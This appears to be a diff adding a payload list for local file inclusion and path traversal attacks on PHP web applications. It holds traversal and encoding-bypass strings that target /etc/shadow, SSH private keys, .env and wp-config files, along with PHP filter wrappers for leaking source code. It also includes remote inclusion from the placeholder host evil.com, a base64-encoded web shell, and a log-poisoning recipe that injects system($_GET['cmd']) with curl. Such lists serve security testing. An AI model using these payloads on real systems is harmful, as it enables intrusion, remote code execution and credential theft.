@@ -1,0 +1,84 @@
+# LFI / Path Traversal Payloads
+# Classic traversal + PHP wrappers + log poisoning prep
+
+# ── Basic traversal ───────────────────────────────────────────────────────────
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+# ── Null byte (PHP < 5.3.4) ──────────────────────────────────────────────────
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+
+# ── Encoding bypass ───────────────────────────────────────────────────────────
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+....//....//....//etc/passwd
+..\/..\/..\/etc/passwd
+
+# ── Windows targets ───────────────────────────────────────────────────────────
+..\..\..\..\windows\win.ini
+..\..\..\..\windows\system32\drivers\etc\hosts
+C:\windows\win.ini
+C:\boot.ini
+%SYSTEMROOT%\win.ini
+
+# ── Interesting Linux files ───────────────────────────────────────────────────
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/issue
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/fd/0
+/proc/net/tcp
+/proc/net/fib_trie
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/auth.log
+/var/mail/root
+/root/.ssh/id_rsa
+/root/.bash_history
+/home/user/.ssh/id_rsa
+/home/user/.bash_history
+/app/.env
+/var/www/html/.env
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+/usr/local/etc/nginx/nginx.conf
+
+# ── PHP wrappers (require LFI + PHP) ─────────────────────────────────────────
+# Read PHP source
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=config.php
+php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php
+
+# Remote file inclusion (requires allow_url_include=On)
+php://input     (POST body)
+http://evil.com/shell.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+
+# ── Log poisoning ─────────────────────────────────────────────────────────────
+# Step 1: Poison the log via User-Agent
+# curl -si -A "<?php system($_GET['cmd']); ?>" http://target.com/
+# Step 2: Include the log
+/var/log/apache2/access.log&cmd=id
+/var/log/nginx/access.log&cmd=id
+/proc/self/fd/1&cmd=id
+/proc/self/fd/2&cmd=id
+
+# ── Zip / phar wrappers ───────────────────────────────────────────────────────
+zip://shell.zip%23shell.php
+phar://shell.phar/shell.php
